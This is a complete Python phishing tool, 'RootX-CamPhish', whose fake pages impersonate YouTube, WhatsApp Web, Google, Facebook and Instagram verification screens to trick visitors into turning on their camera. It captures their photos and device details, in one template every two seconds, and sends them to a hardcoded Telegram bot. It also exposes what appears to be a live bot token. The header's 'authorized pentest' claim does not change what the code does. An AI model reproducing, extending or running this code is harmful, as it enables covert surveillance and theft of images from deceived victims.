#!/usr/bin/env python3
# ================================================================
# RootX-CamPhish v1.0
# Professional Camera Phishing Framework
# Captures victim camera photos via phishing page
# Auto-sends captured photos to Telegram Bot
# ================================================================
# Authorized Pentest Use Only
# ================================================================

import os
import sys
import json
import time
import random
import threading
import subprocess
import base64
import socket
import shutil
import signal
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# ──── CONFIG ────
BOT_TOKEN = "8990555847:AAEsiUo2p0voMjiFsoZsH6Ht9wqJ33zKmr0"
CHAT_ID = "8263124140"
SERVER_PORT = 8080
PHISHING_TEMPLATES_DIR = "templates"
CAPTURED_DATA_DIR = "captured"
NGROK_PATH = "ngrok"  # Change if ngrok is in different path

# ──── COLORS ────
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ──── GLOBALS ────
captured_photos = []
server_running = False
ngrok_process = None
current_template = "classic"
public_url = None


# ════════════════════════════════════════════════════════
#  TELEGRAM
# ════════════════════════════════════════════════════════

def tg_send(text):
    """Send message to Telegram"""
    try:
        import requests
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": str(text)[:4000],
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def tg_send_photo(photo_path, caption=""):
    """Send photo to Telegram"""
    try:
        import requests
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': CHAT_ID, 'caption': str(caption)[:1000]}
            requests.post(url, files=files, data=data, timeout=15)
    except:
        pass


# ════════════════════════════════════════════════════════
#  BANNER
# ════════════════════════════════════════════════════════

def show_banner():
    """Display awesome banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{CYAN}
╔══════════════════════════════════════════════════╗
║         {RED}🔥 ROOTX-CAMPHISH v1.0 🔥{CYAN}              ║
║     {YELLOW}Professional Camera Phishing Framework{CYAN}     ║
║══════════════════════════════════════════════════║
║  {GREEN}[✓] Telegram Auto-Send Enabled{RESET}{CYAN}            ║
║  {GREEN}[✓] Multi-Template Support{RESET}{CYAN}               ║
║  {GREEN}[✓] Ngrok/Tunnel Support{RESET}{CYAN}                 ║
╚══════════════════════════════════════════════════╝{RESET}
    """)


# ════════════════════════════════════════════════════════
#  PHISHING PAGE TEMPLATES
# ════════════════════════════════════════════════════════

def get_template_html(template_name="classic"):
    """Generate HTML phishing page with camera permission request"""
    
    templates = {
        "classic": """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .camera-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 25px;
            font-size: 48px;
            color: white;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            width: 100%;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
        }
        .video-container {
            display: none;
            margin-top: 20px;
            border-radius: 10px;
            overflow: hidden;
        }
        video { width: 100%; border-radius: 10px; }
        .loading { display: none; margin-top: 20px; color: #666; }
        #timer { display: none; margin-top: 15px; font-size: 14px; color: #999; }
        .status { 
            margin-top: 20px; 
            padding: 10px;
            border-radius: 10px;
            display: none;
        }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
    </style>
</head>
<body>
<div class="card">
    <div class="camera-icon">📷</div>
    <h1>Camera Access Required</h1>
    <p>You need to enable your camera to continue.<br>Please click the button below to verify.</p>
    
    <div class="video-container">
        <video id="video" autoplay muted playsinline></video>
    </div>
    
    <button class="btn" id="startBtn">📸 Enable Camera</button>
    
    <div class="loading" id="loading">⏳ Processing... Please wait</div>
    <div id="timer"></div>
    <div class="status" id="status"></div>
</div>

<script>
const video = document.getElementById('video');
const startBtn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const timer = document.getElementById('timer');
const statusDiv = document.getElementById('status');
const videoContainer = document.querySelector('.video-container');

let mediaStream = null;
let photoCount = 0;

startBtn.addEventListener('click', async () => {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false 
        });
        
        video.srcObject = mediaStream;
        videoContainer.style.display = 'block';
        startBtn.textContent = '📸 Capturing Photo...';
        startBtn.disabled = true;
        loading.style.display = 'block';
        
        // Start capturing
        captureAndSend();
        
    } catch (err) {
        statusDiv.className = 'status error';
        statusDiv.textContent = '⚠️ Camera access denied. Please allow camera permission.';
        statusDiv.style.display = 'block';
        console.error(err);
    }
});

function captureAndSend() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    const photoData = canvas.toDataURL('image/jpeg', 0.9);
    photoCount++;
    
    // Send to server
    fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            photo: photoData,
            count: photoCount,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            timestamp: new Date().toISOString()
        })
    })
    .then(r => r.json())
    .then(data => {
        if(data.status === 'ok') {
            statusDiv.className = 'status success';
            statusDiv.textContent = '✅ Photo ' + photoCount + ' captured!';
            statusDiv.style.display = 'block';
            
            setTimeout(() => statusDiv.style.display = 'none', 1500);
            setTimeout(() => captureAndSend(), 2000); // Capture every 2 seconds
        }
    })
    .catch(err => {
        console.error(err);
        statusDiv.className = 'status error';
        statusDiv.textContent = '⚠️ Sending failed. Trying again...';
        statusDiv.style.display = 'block';
        setTimeout(() => captureAndSend(), 3000);
    });
}

// Auto-cleanup on page leave
window.addEventListener('beforeunload', () => {
    if(mediaStream) mediaStream.getTracks().forEach(t => t.stop());
});
</script>
</body>
</html>
        """,
        
        "youtube": """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Age Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 12px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        .yt-icon { color: #ff0000; font-size: 60px; margin-bottom: 20px; }
        h1 { color: #0f0f0f; font-size: 22px; margin-bottom: 8px; }
        p { color: #606060; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .age-box {
            background: #f2f2f2;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .verify-btn {
            background: #065fd4;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 20px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .verify-btn:hover { background: #0b57d0; }
        .video-container { display: none; margin-top: 20px; }
        video { width: 100%; border-radius: 8px; }
        .status { margin-top: 15px; padding: 10px; border-radius: 8px; display: none; }
        .status.success { background: #e6f4ea; color: #137333; display: block; }
        .status.error { background: #fce8e6; color: #c5221f; display: block; }
        #loading { display: none; margin-top: 15px; color: #606060; }
    </style>
</head>
<body>
<div class="card">
    <div class="yt-icon">▶️</div>
    <h1>Age Verification Required</h1>
    <p>This video is age-restricted. Verify your age to continue watching.</p>
    <div class="age-box">
        <p>📸 Please allow camera access for facial age verification.</p>
    </div>
    
    <button class="verify-btn" id="verifyBtn">✅ Verify with Camera</button>
    
    <div class="video-container">
        <video id="video" autoplay muted playsinline></video>
    </div>
    <div id="loading">⏳ Verifying... Please hold still</div>
    <div class="status" id="status"></div>
</div>

<script>
const video = document.getElementById('video');
const btn = document.getElementById('verifyBtn');
const loading = document.getElementById('loading');
const statusDiv = document.getElementById('status');
const videoContainer = document.querySelector('.video-container');

btn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
        videoContainer.style.display = 'block';
        btn.disabled = true;
        btn.textContent = '⏳ Verifying...';
        loading.style.display = 'block';
        
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ photo: canvas.toDataURL('image/jpeg') })
            });
            
            loading.style.display = 'none';
            statusDiv.className = 'status success';
            statusDiv.textContent = '✅ Age verified! Redirecting...';
        }, 3000);
        
        setTimeout(() => {
            if(stream) stream.getTracks().forEach(t => t.stop());
        }, 5000);
        
    } catch(e) {
        statusDiv.className = 'status error';
        statusDiv.textContent = '⚠️ Camera permission required.';
        statusDiv.style.display = 'block';
    }
});
</script>
</body>
</html>
        """,
        
        "whatsapp": """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #eae6df;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px;
        }
        .card {
            background: white; border-radius: 8px; padding: 30px;
            max-width: 400px; width: 100%;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            text-align: center;
        }
        .wa-icon { color: #25d366; font-size: 60px; margin-bottom: 15px; }
        h1 { color: #111b21; font-size: 20px; font-weight: 500; }
        p { color: #667781; font-size: 14px; margin: 15px 0 25px; line-height: 1.5; }
        .qr-box {
            background: #f0f0f0; border-radius: 4px; padding: 30px;
            margin-bottom: 20px; border: 2px dashed #ccc;
        }
        .scan-btn {
            background: #00a884; color: white; border: none;
            padding: 12px 35px; border-radius: 24px; font-size: 15px;
            font-weight: 500; cursor: pointer; transition: background 0.2s;
        }
        .scan-btn:hover { background: #009973; }
        .video-container { display: none; margin-top: 20px; }
        video { width: 100%; border-radius: 4px; }
        .status { margin-top: 15px; padding: 10px; border-radius: 4px; display: none; }
        .status.success { background: #dcf8c6; color: #111; display: block; }
        .status.error { background: #fce4e4; color: #c33; display: block; }
    </style>
</head>
<body>
<div class="card">
    <div class="wa-icon">💬</div>
    <h1>WhatsApp Web</h1>
    <p>Scan this QR code with your phone camera to link WhatsApp Web.</p>
    <div class="qr-box">
        <p style="color:#999;font-size:13px;">📷 Camera QR Scanner</p>
        <p style="color:#ccc;font-size:11px;margin-top:10px;">[ Camera-based QR scanning ]</p>
    </div>
    <button class="scan-btn" id="scanBtn">📷 Scan QR Code</button>
    <div class="video-container"><video id="video" autoplay muted playsinline></video></div>
    <div class="status" id="status"></div>
</div>
<script>
const video = document.getElementById('video');
const btn = document.getElementById('scanBtn');
const statusDiv = document.getElementById('status');
const videoContainer = document.querySelector('.video-container');

btn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
        video.srcObject = stream; videoContainer.style.display = 'block';
        btn.textContent = '🔍 Scanning...';
        
        setInterval(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 320; canvas.height = 240;
            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ photo: canvas.toDataURL('image/jpeg') })
            });
            statusDiv.className = 'status success';
            statusDiv.textContent = '✅ Scanning... Found device!';
        }, 3000);
    } catch(e) {
        statusDiv.className = 'status error';
        statusDiv.textContent = '⚠️ Camera permission needed';
        statusDiv.style.display = 'block';
    }
});
</script>
</body>
</html>
        """,
        
        "google": """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background: #fff;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px;
        }
        .card {
            border: 1px solid #dadce0; border-radius: 8px;
            padding: 48px 40px 36px; max-width: 450px; width: 100%;
            text-align: center;
        }
        .g-icon { font-size: 40px; margin-bottom: 15px; }
        h1 { color: #202124; font-size: 24px; font-weight: 400; }
        p { color: #5f6368; font-size: 16px; margin: 8px 0 30px; }
        .verify-btn {
            background: #1a73e8; color: white; border: none;
            padding: 12px 24px; border-radius: 4px; font-size: 14px;
            font-weight: 500; cursor: pointer; letter-spacing: 0.25px;
        }
        .verify-btn:hover { background: #1765cc; }
        .video-container { display: none; margin-top: 20px; }
        video { width: 100%; border-radius: 4px; }
        .status { margin-top: 15px; padding: 10px; border-radius: 4px; display: none; }
        .status.success { background: #e6f4ea; color: #137333; display: block; }
        .status.error { background: #fce8e6; color: #d93025; display: block; }
    </style>
</head>
<body>
<div class="card">
    <div class="g-icon">🔐</div>
    <h1>Sign in with Google</h1>
    <p>Face verification required for security<br>Google will verify it's you</p>
    <button class="verify-btn" id="verifyBtn">Verify your face</button>
    <div class="video-container"><video id="video" autoplay muted playsinline></video></div>
    <div class="status" id="status"></div>
</div>
<script>
const video = document.getElementById('video'), btn = document.getElementById('verifyBtn'), st = document.getElementById('status'), vc = document.querySelector('.video-container');
btn.onclick = async () => {
    try {
        const s = await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject = s; vc.style.display = 'block';
        btn.textContent = 'Verifying...'; btn.disabled = true;
        setTimeout(() => {
            const c = document.createElement('canvas');
            c.width=640; c.height=480;
            c.getContext('2d').drawImage(video,0,0);
            fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:c.toDataURL('image/jpeg')})});
            st.className='status success'; st.textContent='✅ Verified!'; st.style.display='block';
            setTimeout(()=>{if(s)s.getTracks().forEach(t=>t.stop())},2000);
        },2500);
    } catch(e){st.className='status error'; st.textContent='⚠️ Camera required'; st.style.display='block';}
};
</script>
</body>
</html>
        """,
        
        "facebook": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook - Security Check</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:8px;padding:20px;max-width:396px;width:100%;box-shadow:0 2px 4px rgba(0,0,0,.1);text-align:center}
.fb-icon{color:#1877f2;font-size:50px;margin-bottom:10px}
h2{color:#1c1e21;font-size:20px}
p{color:#606770;font-size:15px;margin:10px 0 20px}
.fb-btn{background:#1877f2;color:#fff;border:none;padding:10px 20px;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;width:100%}
.fb-btn:hover{background:#166fe5}
.video-container{display:none;margin-top:15px}
video{width:100%;border-radius:6px}
.status{margin-top:12px;padding:8px;border-radius:6px;display:none}
.status.success{background:#e8f5e9;color:#1b5e20;display:block}
.status.error{background:#fce4ec;color:#b71c1c;display:block}
</style></head>
<body>
<div class="card">
<div class="fb-icon">f</div>
<h2>Security Check</h2>
<p>We detected a new login. Please verify your identity with a quick photo.</p>
<button class="fb-btn" id="fbBtn">📸 Take Photo</button>
<div class="video-container"><video id="video" autoplay muted playsinline></video></div>
<div class="status" id="status"></div>
</div>
<script>
const v=document.getElementById('video'),b=document.getElementById('fbBtn'),s=document.getElementById('status'),vc=document.querySelector('.video-container');
b.onclick=async()=>{
try{
const m=await navigator.mediaDevices.getUserMedia({video:true});
v.srcObject=m;vc.style.display='block';b.textContent='📸 Capturing...';
setTimeout(()=>{
const c=document.createElement('canvas');c.width=640;c.height=480;
c.getContext('2d').drawImage(v,0,0);
fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:c.toDataURL('image/jpeg')})});
s.className='status success';s.textContent='✅ Photo captured!';s.style.display='block';
m.getTracks().forEach(t=>t.stop());
},2000);
}catch(e){s.className='status error';s.textContent='⚠️ Camera access needed';s.style.display='block';}
};
</script></body></html>
        """,
        
        "instagram": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram - Verify It's You</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px;max-width:350px;width:100%;text-align:center}
.ig-icon{font-size:40px;margin-bottom:15px}
h1{color:#262626;font-size:18px;font-weight:600}
p{color:#8e8e8e;font-size:14px;margin:10px 0 20px;line-height:1.4}
.ig-btn{background:#0095f6;color:#fff;border:none;padding:8px 16px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
.ig-btn:hover{background:#1877f2}
.video-container{display:none;margin-top:15px}
video{width:100%;border-radius:4px}
.status{margin-top:12px;padding:8px;border-radius:4px;display:none}
.status.success{background:#e8f5e9;color:#1b5e20;display:block}
.status.error{background:#fce4ec;color:#b71c1c;display:block}
</style></head>
<body>
<div class="card">
<div class="ig-icon">📸</div>
<h1>Verify It's You</h1>
<p>We noticed a login from a new device. Take a selfie to confirm your identity.</p>
<button class="ig-btn" id="igBtn">Take Selfie</button>
<div class="video-container"><video id="video" autoplay muted playsinline></video></div>
<div class="status" id="status"></div>
</div>
<script>
const v=document.getElementById('video'),b=document.getElementById('igBtn'),s=document.getElementById('status'),vc=document.querySelector('.video-container');
b.onclick=async()=>{
try{
const m=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
v.srcObject=m;vc.style.display='block';b.textContent='📸 Capturing...';
setTimeout(()=>{
const c=document.createElement('canvas');c.width=640;c.height=480;
c.getContext('2d').drawImage(v,0,0);
fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:c.toDataURL('image/jpeg'),type:'instagram_verify'})});
s.className='status success';s.textContent='✅ Verification photo sent!';s.style.display='block';
m.getTracks().forEach(t=>t.stop());
setTimeout(()=>{window.location='https://instagram.com'},2000);
},2500);
}catch(e){s.className='status error';s.textContent='⚠️ Camera access required';s.style.display='block';}
};
</script></body></html>
        """
    }
    
    return templates.get(template_name, templates["classic"])


# ════════════════════════════════════════════════════════
#  HTTP SERVER
# ════════════════════════════════════════════════════════

class CamPhishHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing server"""
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=UTF-8')
            self.end_headers()
            html = get_template_html(current_template)
            self.wfile.write(html.encode())
            
        elif path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            data = json.dumps({
                'captured': len(captured_photos),
                'online': datetime.now().isoformat()
            })
            self.wfile.write(data.encode())
            
        else:
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/capture':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body.decode())
                photo_b64 = data.get('photo', '')
                
                if photo_b64 and photo_b64.startswith('data:image'):
                    # Extract base64 data
                    img_data = base64.b64decode(photo_b64.split(',')[1])
                    
                    # Save to file
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                    random_id = random.randint(1000, 9999)
                    filename = f"photo_{timestamp}_{random_id}.jpg"
                    filepath = os.path.join(CAPTURED_DATA_DIR, filename)
                    
                    with open(filepath, 'wb') as f:
                        f.write(img_data)
                    
                    captured_photos.append(filepath)
                    
                    # Extra info
                    extra = {
                        'ua': data.get('userAgent', ''),
                        'platform': data.get('platform', ''),
                        'count': data.get('count', 1),
                        'ts': data.get('timestamp', '')
                    }
                    
                    # Send to Telegram
                    caption = (
                        f"📸 <b>Camera Capture #{len(captured_photos)}</b>\n"
                        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"📱 Target Info: {data.get('platform', 'Unknown')}\n"
                        f"🆔 Photo ID: {random_id}"
                    )
                    
                    tg_send_photo(filepath, caption)
                    
                    # Also send info message
                    tg_send(
                        f"<b>📸 New Camera Capture!</b>\n"
                        f"━━━━━━━━━━━━━━━━━\n"
                        f"<b>File:</b> {filename}\n"
                        f"<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                        f"<b>Platform:</b> {data.get('platform', 'N/A')}\n"
                        f"<b>Total Captures:</b> {len(captured_photos)}\n"
                        f"<b>Public URL:</b> {public_url or 'N/A'}"
                    )
                    
                    print(f"{GREEN}[✓]{RESET} Photo captured → {filename}")
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    response = json.dumps({'status': 'ok', 'captured': len(captured_photos)})
                    self.wfile.write(response.encode())
                else:
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'status': 'error', 'msg': 'Invalid photo data'}).encode())
                    
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'error', 'msg': str(e)}).encode())
                
        else:
            self.send_response(404)
            self.end_headers()


# ════════════════════════════════════════════════════════
#  SERVER MANAGEMENT
# ════════════════════════════════════════════════════════

def start_local_server():
    """Start local HTTP server"""
    global server_running
    
    try:
        server = HTTPServer(('0.0.0.0', SERVER_PORT), CamPhishHandler)
        print(f"\n{GREEN}[✓]{RESET} Local server started on {BLUE}http://0.0.0.0:{SERVER_PORT}{RESET}")
        server_running = True
        server.serve_forever()
    except Exception as e:
        print(f"{RED}[!]{RESET} Server error: {e}")
        server_running = False


def start_ngrok():
    """Start ngrok tunnel"""
    global ngrok_process, public_url
    
    print(f"\n{YELLOW}[*]{RESET} Starting ngrok tunnel...")
    
    try:
        # Kill any existing ngrok
        if os.name == 'nt':
            os.system('taskkill /f /im ngrok.exe 2>nul')
        else:
            os.system('pkill -f ngrok 2>/dev/null')
        
        ngrok_process = subprocess.Popen(
            [NGROK_PATH, 'http', str(SERVER_PORT), '--log=stdout'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        time.sleep(3)
        
        # Get public URL from ngrok API
        try:
            import requests
            r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
            data = r.json()
            tunnels = data.get('tunnels', [])
            if tunnels:
                public_url = tunnels[0].get('public_url', '')
                print(f"{GREEN}[✓]{RESET} Ngrok tunnel: {BLUE}{public_url}{RESET}")
                
                # Send to Telegram
                tg_send(
                    f"<b>🚀 RootX-CamPhish Online!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<b>URL:</b> <code>{public_url}</code>\n"
                    f"<b>Template:</b> {current_template}\n"
                    f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<i>Send this link to target</i>"
                )
            else:
                print(f"{RED}[!]{RESET} No tunnels found from ngrok API")
                public_url = "TUNNEL_ERROR"
        except:
            print(f"{RED}[!]{RESET} Could not get ngrok URL (API not ready)")
            public_url = "NGROK_API_ERROR"
            
    except FileNotFoundError:
        print(f"{RED}[!]{RESET} ngrok not found! Download from https://ngrok.com/download")
        print(f"{YELLOW}[*]{RESET} Your server is still running locally at port {SERVER_PORT}")
        public_url = f"http://localhost:{SERVER_PORT}"
    except Exception as e:
        print(f"{RED}[!]{RESET} Ngrok error: {e}")
        public_url = f"http://localhost:{SERVER_PORT}"


def cleanup():
    """Cleanup on exit"""
    global server_running, ngrok_process
    
    print(f"\n{YELLOW}[*]{RESET} Cleaning up...")
    
    if ngrok_process:
        ngrok_process.terminate()
        print(f"{GREEN}[✓]{RESET} ngrok stopped")
    
    server_running = False
    print(f"{GREEN}[✓]{RESET} Server stopped")
    print(f"{GREEN}[✓]{RESET} Total photos captured: {len(captured_photos)}")
    
    # Final report to Telegram
    if captured_photos:
        tg_send(
            f"<b>📊 RootX-CamPhish Session Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Photos Captured:</b> {len(captured_photos)}\n"
            f"<b>Template Used:</b> {current_template}\n"
            f"<b>Public URL:</b> {public_url or 'N/A'}\n"
            f"<b>Session End:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>All photos sent to chat ✅</i>"
        )
        print(f"{GREEN}[✓]{RESET} Report sent to Telegram ✅")


def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    print(f"\n{RED}[!]{RESET} Interrupt received, shutting down...")
    cleanup()
    sys.exit(0)


# ════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════

def main():
    """Main entry point"""
    global current_template, SERVER_PORT
    
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create directories
    os.makedirs(CAPTURED_DATA_DIR, exist_ok=True)
    
    # Show banner
    show_banner()
    
    # Check requirements
    print(f"{YELLOW}[*]{RESET} Checking requirements...")
    try:
        import requests
        print(f"  {GREEN}[✓]{RESET} requests module installed")
    except:
        print(f"  {RED}[✗]{RESET} requests module not installed. Installing...")
        os.system('pip install requests')
    
    # Check ngrok
    if shutil.which(NGROK_PATH) or os.path.exists(NGROK_PATH):
        print(f"  {GREEN}[✓]{RESET} ngrok found")
    else:
        print(f"  {YELLOW}[!]{RESET} ngrok not found. Download: https://ngrok.com/download")
        print(f"  {YELLOW}[!]{RESET} Local URL will be used")
    
    print()
    
    # ──── MENU ────
    print(f"{BOLD}Select Template:{RESET}")
    print(f"  {CYAN}[1]{RESET} Classic - Camera Access Required")
    print(f"  {CYAN}[2]{RESET} YouTube - Age Verification")
    print(f"  {CYAN}[3]{RESET} WhatsApp Web - QR Scanner")
    print(f"  {CYAN}[4]{RESET} Google Sign In - Face Verify")
    print(f"  {CYAN}[5]{RESET} Facebook - Security Check")  
    print(f"  {CYAN}[6]{RESET} Instagram - Verify Selfie")
    print()
    
    choice = input(f"{BOLD}[?]{RESET} Select template [1-6] (default 1): ").strip() or "1"
    
    template_map = {
        "1": "classic",
        "2": "youtube",
        "3": "whatsapp",
        "4": "google",
        "5": "facebook",
        "6": "instagram"
    }
    
    current_template = template_map.get(choice, "classic")
    print(f"  {GREEN}[✓]{RESET} Template selected: {BOLD}{current_template}{RESET}")
    print()
    
    # Port
    port_input = input(f"{BOLD}[?]{RESET} Port (default 8080): ").strip()
    if port_input and port_input.isdigit():
        SERVER_PORT = int(port_input)
    
    # Tunnel option
    print(f"\n  {CYAN}[1]{RESET} Local only (http://localhost:{SERVER_PORT})")
    print(f"  {CYAN}[2]{RESET} ngrok tunnel (public URL)")
    print()
    tunnel_choice = input(f"{BOLD}[?]{RESET} Tunnel option [1/2] (default 1): ").strip() or "1"
    
    print(f"\n{YELLOW}[*]{RESET} Starting server...\n")
    
    # Start server in separate thread
    server_thread = threading.Thread(target=start_local_server, daemon=True)
    server_thread.start()
    
    time.sleep(1)
    
    # Start tunnel if selected
    if tunnel_choice == "2":
        start_ngrok()
    else:
        local_ip = socket.gethostbyname(socket.gethostname())
        print(f"{GREEN}[✓]{RESET} Local URL: {BLUE}http://localhost:{SERVER_PORT}{RESET}")
        print(f"{GREEN}[✓]{RESET} Network URL: {BLUE}http://{local_ip}:{SERVER_PORT}{RESET}")
        public_url = f"http://{local_ip}:{SERVER_PORT}"
        
        tg_send(
            f"<b>🚀 RootX-CamPhish Online!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>URL:</b> <code>http://{local_ip}:{SERVER_PORT}</code>\n"
            f"<b>Template:</b> {current_template}\n"
            f"<b>Status:</b> Waiting for target..."
        )
    
    print(f"\n{GREEN}[✓]{RESET} Server is running! Press {BOLD}Ctrl+C{RESET} to stop")
